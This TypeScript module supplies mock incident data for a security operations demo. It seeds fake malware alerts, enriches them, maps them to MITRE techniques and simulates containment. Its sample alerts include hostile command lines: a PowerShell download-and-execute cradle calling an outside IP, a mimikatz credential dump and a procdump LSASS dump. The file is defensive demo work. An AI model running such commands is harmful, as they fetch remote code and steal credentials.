import type {
  ActionResult,
  EnrichedAlert,
  IncidentRecord,
  IncidentSummary,
  MalwareAlert,
  MitreMapping,
  ProcessAlertInput,
  ReportArtifacts,
  RiskLevel,
  SampleOption,
  ScenarioKey,
  ScenarioOption,
  Severity,
} from "../types";

interface MockAlertSeed {
  sampleId: string;
  label: string;
  scenario: Exclude<ScenarioKey, "random" | "dangerous_process">;
  description: string;
  alert: MalwareAlert;
}

interface ScenarioProfile {
  riskScore: number;
  riskLevel: RiskLevel;
  assetCriticality: "normal" | "high" | "critical";
  hashEnrichment: EnrichedAlert["hash_enrichment"];
  ipEnrichment: EnrichedAlert["ip_enrichment"];
  mitre: MitreMapping[];
  actions: string[];
  reasoning: string[];
  status: string;
  narrative: string;
}

let mockIncidentStore: IncidentRecord[] | null = null;
const sampleSeeds: MockAlertSeed[] = [
  {
    sampleId: "alert_04_full_critical",
    label: "Full critical chain",
    scenario: "mixed",
    description: "Ransomware-like chain with malicious hash, C2 traffic, and high-value host impact.",
    alert: {
      alert_id: "a4000004-0000-0000-0000-000000000004",
      hostname: "SRV-FIN01",
      username: "thi.pham",
      process_name: "mimikatz.exe",
      file_path: "C:\\Users\\Public\\mimikatz.exe",
      file_hash: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
      parent_process: "excel.exe",
      command_line: "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
      destination_ip: "194.165.16.11",
      severity: "critical",
      detection_name: "Ransomware.BlackCat.A",
    },
  },
  {
    sampleId: "alert_01_malicious_hash",
    label: "Malicious hash confirmed",
    scenario: "malicious_hash",
    description: "Hash already verified by multiple vendors and linked to a beacon stage.",
    alert: {
      alert_id: "a1000001-0000-0000-0000-000000000001",
      hostname: "WS-HR-01",
      username: "linda.nguyen",
      process_name: "powershell.exe",
      file_path: "C:\\Users\\linda.nguyen\\AppData\\Local\\Temp\\update32.exe",
      file_hash: "cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe",
      parent_process: "winword.exe",
      command_line: "powershell.exe -nop -w hidden -enc SGVsbG8gV29ybGQgLSBUaGlzIGlzIGEgbW9jayBlbmNvZGVkIGNvbW1hbmQ=",
      destination_ip: "198.51.100.10",
      severity: "high",
      detection_name: "Backdoor.Cobalt.Strike.Beacon",
    },
  },
  {
    sampleId: "alert_02_c2_communication",
    label: "C2 communication",
    scenario: "c2_communication",
    description: "PowerShell activity communicating with a known Tor exit node flagged as C2.",
    alert: {
      alert_id: "a2000002-0000-0000-0000-000000000002",
      hostname: "WS-DEV-01",
      username: "minh.tran",
      process_name: "powershell.exe",
      file_path: "C:\\Users\\minh.tran\\Downloads\\helper.ps1",
      file_hash: "0000000000000000000000000000000000000000000000000000000000000001",
      parent_process: "explorer.exe",
      command_line: "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage')",
      destination_ip: "185.220.101.45",
      severity: "high",
      detection_name: "Suspicious.Network.C2.Connection",
    },
  },
  {
    sampleId: "alert_03_critical_asset",
    label: "Critical asset at risk",
    scenario: "critical_asset",
    description: "Suspicious PowerShell execution on a domain controller with elevated business impact.",
    alert: {
      alert_id: "a3000003-0000-0000-0000-000000000003",
      hostname: "SRV-DC01",
      username: "SYSTEM",
      process_name: "powershell.exe",
      file_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      file_hash: "f00dbabef00dbabef00dbabef00dbabef00dbabef00dbabef00dbabef00dbabe",
      parent_process: "svchost.exe",
      command_line: "powershell.exe -ExecutionPolicy Bypass -enc SGVsbG8gV29ybGQ=",
      destination_ip: "203.0.113.5",
      severity: "medium",
      detection_name: "Suspicious.Powershell.Execution.OnDC",
    },
  },
  {
    sampleId: "alert_05_benign",
    label: "Benign baseline",
    scenario: "benign",
    description: "Administrative backup script with clean telemetry and low operational urgency.",
    alert: {
      alert_id: "a5000005-0000-0000-0000-000000000005",
      hostname: "DESKTOP-ABC123",
      username: "john.doe",
      process_name: "powershell.exe",
      file_path: "C:\\scripts\\backup_daily.ps1",
      file_hash: "0000000000000000000000000000000000000000000000000000000000000002",
      parent_process: "taskschd.exe",
      command_line: "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\scripts\\backup_daily.ps1",
      destination_ip: "10.0.0.1",
      severity: "low",
      detection_name: "Suspicious.Powershell.Execution",
    },
  },
];

const dangerousProcessTemplate: MalwareAlert = {
  alert_id: "a6000006-0000-0000-0000-000000000006",
  hostname: "WS-OPS-07",
  username: "ops.analyst",
  process_name: "procdump.exe",
  file_path: "C:\\Users\\Public\\procdump.exe",
  file_hash: "0011223300112233001122330011223300112233001122330011223300112233",
  parent_process: "cmd.exe",
  command_line: "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
  destination_ip: "198.18.0.42",
  severity: "high",
  detection_name: "Credential.Dumping.Attempt",
};

const scenarioProfiles: Record<Exclude<ScenarioKey, "random">, ScenarioProfile> = {
  mixed: {
    riskScore: 95,
    riskLevel: "critical",
    assetCriticality: "critical",
    hashEnrichment: {
      reputation: "malicious",
      malicious_vendors: 68,
      total_vendors: 72,
      source: "VirusTotal mirror",
    },
    ipEnrichment: {
      ip_address: "194.165.16.11",
      reputation: "malicious",
      confidence_score: 98,
      is_c2: true,
      country: "RU",
      source: "Threat intel gateway",
    },
    mitre: [
      {
        technique_id: "T1003.001",
        technique_name: "LSASS Memory",
        tactic: "Credential Access",
        matched_pattern: "mimikatz.exe",
        confidence: 0.97,
      },
      {
        technique_id: "T1486",
        technique_name: "Data Encrypted for Impact",
        tactic: "Impact",
        matched_pattern: "BlackCat ransomware",
        confidence: 0.9,
      },
      {
        technique_id: "T1071.001",
        technique_name: "Web Protocols",
        tactic: "Command and Control",
        matched_pattern: "outbound C2 beacon",
        confidence: 0.88,
      },
    ],
    actions: ["isolate_host", "block_ip", "kill_process", "create_ticket", "notify_soc"],
    reasoning: [
      "Multiple high-confidence indicators align across hash, process behavior, and outbound network activity.",
      "The affected asset is tagged as finance-critical, so containment was prioritized over observation.",
      "Policy raised an emergency ticket and recommended analyst validation after automated isolation.",
    ],
    status: "contained",
    narrative:
      "High-confidence malicious activity was contained automatically. The host was isolated, the destination IP was blocked, and the suspicious process was terminated while the ticket remained open for analyst follow-up.",
  },
  malicious_hash: {
    riskScore: 81,
    riskLevel: "critical",
    assetCriticality: "high",
    hashEnrichment: {
      reputation: "malicious",
      malicious_vendors: 65,
      total_vendors: 72,
      source: "Hash reputation cluster",
    },
    ipEnrichment: {
      ip_address: "198.51.100.10",
      reputation: "unknown",
      confidence_score: 42,
      is_c2: false,
      country: "US",
      source: "Network reputation cache",
    },
    mitre: [
      {
        technique_id: "T1059.001",
        technique_name: "PowerShell",
        tactic: "Execution",
        matched_pattern: "encoded PowerShell",
        confidence: 0.92,
      },
      {
        technique_id: "T1105",
        technique_name: "Ingress Tool Transfer",
        tactic: "Command and Control",
        matched_pattern: "dropped update32.exe",
        confidence: 0.78,
      },
    ],
    actions: ["isolate_host", "create_ticket", "notify_soc"],
    reasoning: [
      "The executable hash matches a known malicious cluster seen in multiple malware sandboxes.",
      "Parent-child process lineage suggests document-driven initial access and staged execution.",
      "Host isolation was selected because lateral movement risk outweighed user disruption.",
    ],
    status: "contained",
    narrative:
      "The alert scored as critical because the dropped binary hash is already known malicious. Automated response isolated the workstation and routed the case to analysts for artifact collection.",
  },
  c2_communication: {
    riskScore: 74,
    riskLevel: "high",
    assetCriticality: "normal",
    hashEnrichment: {
      reputation: "unknown",
      malicious_vendors: 1,
      total_vendors: 72,
      source: "Hash reputation cluster",
    },
    ipEnrichment: {
      ip_address: "185.220.101.45",
      reputation: "malicious",
      confidence_score: 100,
      is_c2: true,
      country: "NL",
      source: "Abuse stream",
    },
    mitre: [
      {
        technique_id: "T1071.001",
        technique_name: "Web Protocols",
        tactic: "Command and Control",
        matched_pattern: "web client download cradle",
        confidence: 0.95,
      },
      {
        technique_id: "T1105",
        technique_name: "Ingress Tool Transfer",
        tactic: "Command and Control",
        matched_pattern: "DownloadString stage",
        confidence: 0.86,
      },
    ],
    actions: ["block_ip", "create_ticket", "notify_soc"],
    reasoning: [
      "Known C2 infrastructure was contacted directly from a user workstation with scripted download behavior.",
      "Confidence score reached 100, so outbound network containment was applied immediately.",
      "The incident remained high rather than critical because host-level malicious payload execution is not yet confirmed.",
    ],
    status: "monitoring",
    narrative:
      "Network containment blocked the suspicious destination IP and preserved the incident for follow-up investigation. Analysts should validate whether the staged payload executed successfully on the endpoint.",
  },
  critical_asset: {
    riskScore: 68,
    riskLevel: "high",
    assetCriticality: "critical",
    hashEnrichment: {
      reputation: "unknown",
      malicious_vendors: 0,
      total_vendors: 72,
      source: "Hash reputation cluster",
    },
    ipEnrichment: {
      ip_address: "203.0.113.5",
      reputation: "unknown",
      confidence_score: 26,
      is_c2: false,
      country: "SG",
      source: "Network reputation cache",
    },
    mitre: [
      {
        technique_id: "T1059.001",
        technique_name: "PowerShell",
        tactic: "Execution",
        matched_pattern: "encoded command on DC",
        confidence: 0.83,
      },
      {
        technique_id: "T1027",
        technique_name: "Obfuscated Files or Information",
        tactic: "Defense Evasion",
        matched_pattern: "encoded payload",
        confidence: 0.74,
      },
    ],
    actions: ["escalate", "create_ticket", "notify_soc"],
    reasoning: [
      "The command was executed on a domain controller, so the blast radius is materially higher than a standard workstation event.",
      "Hash and network signals are incomplete, but encoded PowerShell still warrants escalation.",
      "No hard containment was performed automatically to avoid disrupting core identity services without analyst confirmation.",
    ],
    status: "escalated",
    narrative:
      "This incident was escalated because it hit a critical identity asset. The workflow raised analyst priority, attached context to the ticket, and preserved all response options for a human approval step.",
  },
  dangerous_process: {
    riskScore: 72,
    riskLevel: "high",
    assetCriticality: "high",
    hashEnrichment: {
      reputation: "suspicious",
      malicious_vendors: 12,
      total_vendors: 72,
      source: "Hash reputation cluster",
    },
    ipEnrichment: {
      ip_address: "198.18.0.42",
      reputation: "clean",
      confidence_score: 0,
      is_c2: false,
      country: "Internal",
      source: "Network reputation cache",
    },
    mitre: [
      {
        technique_id: "T1003.001",
        technique_name: "LSASS Memory",
        tactic: "Credential Access",
        matched_pattern: "procdump lsass",
        confidence: 0.96,
      },
      {
        technique_id: "T1055",
        technique_name: "Process Injection",
        tactic: "Defense Evasion",
        matched_pattern: "credential dumping toolset",
        confidence: 0.62,
      },
    ],
    actions: ["kill_process", "create_ticket", "notify_soc"],
    reasoning: [
      "The process behavior strongly suggests credential dumping activity and created immediate identity risk.",
      "Network evidence is limited, so the workflow terminated the process but did not isolate the host by default.",
      "Analysts should verify whether any dumped artifacts were written to disk or exfiltrated.",
    ],
    status: "contained",
    narrative:
      "The suspicious process was terminated automatically and triaged as high priority. Follow-up review should focus on credential exposure and privilege escalation opportunities.",
  },
  benign: {
    riskScore: 18,
    riskLevel: "low",
    assetCriticality: "normal",
    hashEnrichment: {
      reputation: "clean",
      malicious_vendors: 0,
      total_vendors: 72,
      source: "Hash reputation cluster",
    },
    ipEnrichment: {
      ip_address: "10.0.0.1",
      reputation: "clean",
      confidence_score: 0,
      is_c2: false,
      country: "Internal",
      source: "Network reputation cache",
    },
    mitre: [
      {
        technique_id: "T1059.001",
        technique_name: "PowerShell",
        tactic: "Execution",
        matched_pattern: "scheduled script",
        confidence: 0.24,
      },
    ],
    actions: ["create_ticket", "notify_soc"],
    reasoning: [
      "Signals are consistent with routine administrative behavior and the hash has no malicious reputation.",
      "A low-priority ticket was still created to maintain visibility and support analyst trend review.",
      "No automated remediation was triggered because the event remains within expected operational behavior.",
    ],
    status: "monitoring",
    narrative:
      "The event is retained as a low-risk operational record. No automated remediation was required beyond creating a lightweight audit ticket.",
  },
};

export const scenarioOptions: ScenarioOption[] = [
  {
    value: "mixed",
    label: "Mixed critical chain",
    description: "Best demo path for a full containment workflow.",
  },
  {
    value: "malicious_hash",
    label: "Malicious hash",
    description: "Known malware hash with workstation isolation.",
  },
  {
    value: "c2_communication",
    label: "C2 communication",
    description: "Outbound beaconing and network containment.",
  },
  {
    value: "critical_asset",
    label: "Critical asset",
    description: "Escalation path for high-value infrastructure.",
  },
  {
    value: "dangerous_process",
    label: "Dangerous process",
    description: "Credential dumping behavior without full host isolation.",
  },
  {
    value: "benign",
    label: "Benign baseline",
    description: "Low-risk admin activity kept for visibility.",
  },
  {
    value: "random",
    label: "Random blend",
    description: "Rotate through multiple scenarios for live demos.",
  },
];

export const sampleOptions: SampleOption[] = sampleSeeds.map((seed) => ({
  value: seed.sampleId,
  label: seed.label,
  scenario: seed.scenario,
  description: seed.description,
}));

export function getDefaultJson(): string {
  return JSON.stringify(sampleSeeds[0].alert, null, 2);
}

export function getSampleAlert(sampleId: string): MalwareAlert {
  return structuredClone(sampleSeeds.find((seed) => seed.sampleId === sampleId)?.alert ?? sampleSeeds[0].alert);
}

function makeIso(minutesAgo: number): string {
  return new Date(Date.now() - minutesAgo * 60000).toISOString();
}

function generateIncidentId(value: string): number {
  return Array.from(value).reduce((hash, char) => (hash * 31 + char.charCodeAt(0)) % 1000000, 17);
}

function uniqueSuffix(): string {
  if (typeof crypto !== "undefined" && "randomUUID" in crypto) {
    return crypto.randomUUID().slice(0, 8);
  }

  return Math.random().toString(16).slice(2, 10);
}

function detectScenario(alert: MalwareAlert): Exclude<ScenarioKey, "random"> {
  const hostname = alert.hostname.toLowerCase();
  const processName = alert.process_name.toLowerCase();
  const detectionName = alert.detection_name.toLowerCase();

  if (processName.includes("mimikatz") || detectionName.includes("ransomware")) {
    return "mixed";
  }

  if (processName.includes("procdump") || alert.command_line.toLowerCase().includes("lsass")) {
    return "dangerous_process";
  }

  if (hostname.includes("dc") || hostname.includes("fin")) {
    return "critical_asset";
  }

  if (["185.220.101.45", "194.165.16.11"].includes(alert.destination_ip)) {
    return "c2_communication";
  }

  if (
    alert.file_hash.startsWith("cafebabe") ||
    detectionName.includes("beacon") ||
    detectionName.includes("backdoor")
  ) {
    return "malicious_hash";
  }

  return "benign";
}

function normalizeSeverity(value: unknown): Severity {
  const candidate = String(value ?? "medium").toLowerCase();
  if (candidate === "low" || candidate === "medium" || candidate === "high" || candidate === "critical") {
    return candidate;
  }
  return "medium";
}

function createAlertFromScenario(scenario: ScenarioKey): MalwareAlert {
  if (scenario === "dangerous_process") {
    return structuredClone(dangerousProcessTemplate);
  }

  if (scenario === "random") {
    const candidates = [
      "mixed",
      "malicious_hash",
      "c2_communication",
      "critical_asset",
      "dangerous_process",
      "benign",
    ] as const;
    const nextScenario = candidates[Math.floor(Math.random() * candidates.length)];
    return createAlertFromScenario(nextScenario);
  }

  const seed = sampleSeeds.find((item) => item.scenario === scenario) ?? sampleSeeds[0];
  return structuredClone(seed.alert);
}

function normalizeAlert(candidate: Partial<MalwareAlert>): MalwareAlert {
  const baseline = structuredClone(sampleSeeds[0].alert);

  return {
    alert_id: String(candidate.alert_id ?? baseline.alert_id),
    hostname: String(candidate.hostname ?? baseline.hostname),
    username: String(candidate.username ?? baseline.username),
    process_name: String(candidate.process_name ?? baseline.process_name),
    file_path: String(candidate.file_path ?? baseline.file_path),
    file_hash: String(candidate.file_hash ?? baseline.file_hash),
    parent_process: String(candidate.parent_process ?? baseline.parent_process),
    command_line: String(candidate.command_line ?? baseline.command_line),
    destination_ip: String(candidate.destination_ip ?? baseline.destination_ip),
    severity: normalizeSeverity(candidate.severity ?? baseline.severity),
    detection_name: String(candidate.detection_name ?? baseline.detection_name),
  };
}

function ticketForAlert(alert: MalwareAlert, riskLevel: RiskLevel): string {
  const prefix = riskLevel === "critical" ? "SOC-P1" : riskLevel === "high" ? "SOC-P2" : "SOC-P3";
  return `${prefix}-${alert.alert_id.slice(-4)}`;
}

function actionResultList(actions: string[], completedAt: string): ActionResult[] {
  return actions.map((action, index) => ({
    action,
    status: action === "notify_soc" ? "queued" : "success",
    executed_at: new Date(new Date(completedAt).getTime() - (actions.length - index) * 45000).toISOString(),
    details:
      action === "notify_soc"
        ? "Case summary prepared for analyst handoff."
        : action === "create_ticket"
          ? "Incident record persisted and enriched context attached."
          : `${action.replace(/_/g, " ")} completed by policy engine.`,
  }));
}

function reportForAlert(alert: MalwareAlert, profile: ScenarioProfile, completedAt: string): ReportArtifacts {
  return {
    markdown_path: `/reports/${alert.alert_id}.md`,
    html_path: `/reports/${alert.alert_id}.html`,
    pdf_path: `/reports/${alert.alert_id}.pdf`,
    markdown_content: [
      `## Executive Summary`,
      profile.narrative,
      ``,
      `## Alert Context`,
      `- Host: ${alert.hostname}`,
      `- Detection: ${alert.detection_name}`,
      `- Process: ${alert.process_name}`,
      `- Severity: ${alert.severity}`,
      `- Completed At: ${completedAt}`,
      ``,
      `## Automated Decisions`,
      ...profile.reasoning.map((entry) => `- ${entry}`),
    ].join("\n"),
  };
}

function toSummary(record: IncidentRecord): IncidentSummary {
  return {
    id: record.id,
    alert_id: record.alert_id,
    hostname: record.hostname,
    detection_name: record.detection_name,
    risk_score: record.risk_score,
    risk_level: record.risk_level,
    severity: record.alert.severity,
    process_name: record.alert.process_name,
    destination_ip: record.alert.destination_ip,
    ticket_id: record.ticket_id,
    status: record.status,
    completed_at: record.completed_at,
    report_path: record.report_path,
  };
}

function createIncident(alertInput: MalwareAlert, minutesAgo = 0): IncidentRecord {
  const alert = structuredClone(alertInput);
  const scenario = detectScenario(alert);
  const profile = scenarioProfiles[scenario];
  const completedAt = makeIso(minutesAgo);
  const createdAt = new Date(new Date(completedAt).getTime() - 3 * 60000).toISOString();
  const enrichedAlert: EnrichedAlert = {
    original_alert: alert,
    hash_enrichment: profile.hashEnrichment,
    ip_enrichment: profile.ipEnrichment,
    asset_criticality: profile.assetCriticality,
    mitre_mappings: profile.mitre,
    risk_score: profile.riskScore,
    risk_level: profile.riskLevel,
    enriched_at: new Date(new Date(completedAt).getTime() - 90000).toISOString(),
  };
  const response = {
    enriched_alert: enrichedAlert,
    triggered_actions: profile.actions,
    policy_reasoning: profile.reasoning,
    action_results: actionResultList(profile.actions, completedAt),
    ticket_id: ticketForAlert(alert, profile.riskLevel),
    completed_at: completedAt,
    report_path: `/reports/${alert.alert_id}.md`,
  };
  const report = reportForAlert(alert, profile, completedAt);

  return {
    id: generateIncidentId(alert.alert_id),
    alert_id: alert.alert_id,
    hostname: alert.hostname,
    detection_name: alert.detection_name,
    risk_score: profile.riskScore,
    risk_level: profile.riskLevel,
    ticket_id: response.ticket_id,
    status: profile.status,
    completed_at: completedAt,
    report_path: response.report_path,
    triggered_actions: response.triggered_actions,
    policy_reasoning: response.policy_reasoning,
    action_results: response.action_results,
    created_at: createdAt,
    updated_at: completedAt,
    alert,
    response,
    report,
    enriched_alert: enrichedAlert,
  };
}

function seedIncidents(): IncidentRecord[] {
  return [
    createIncident(sampleSeeds[0].alert, 12),
    createIncident(sampleSeeds[1].alert, 54),
    createIncident(sampleSeeds[2].alert, 110),
    createIncident(sampleSeeds[3].alert, 205),
    createIncident(sampleSeeds[4].alert, 360),
  ].sort((left, right) => right.completed_at.localeCompare(left.completed_at));
}

function readStore(): IncidentRecord[] {
  if (mockIncidentStore === null) {
    mockIncidentStore = seedIncidents();
  }
  return mockIncidentStore;
}

function writeStore(records: IncidentRecord[]): void {
  mockIncidentStore = records.map((record) => structuredClone(record));
}

function prepareAlertForProcessing(alert: MalwareAlert): MalwareAlert {
  const suffix = uniqueSuffix();
  return {
    ...alert,
    alert_id: `${alert.alert_id.slice(0, 12)}-${suffix}`,
  };
}

export function listMockIncidents(): IncidentSummary[] {
  return readStore().map(toSummary);
}

export function getMockIncident(alertId: string): IncidentRecord | null {
  return readStore().find((record) => record.alert_id === alertId) ?? null;
}

export function processMockAlert(input: ProcessAlertInput): IncidentRecord {
  let alert: MalwareAlert;

  if (input.mode === "scenario") {
    alert = createAlertFromScenario(input.scenario);
  } else if (input.mode === "sample") {
    alert = getSampleAlert(input.sampleId);
  } else {
    const raw = JSON.parse(input.rawJson) as Partial<MalwareAlert>;
    alert = normalizeAlert(raw);
  }

  const incident = createIncident(prepareAlertForProcessing(alert));
  const nextRecords = [incident, ...readStore()];
  writeStore(nextRecords);
  return incident;
}
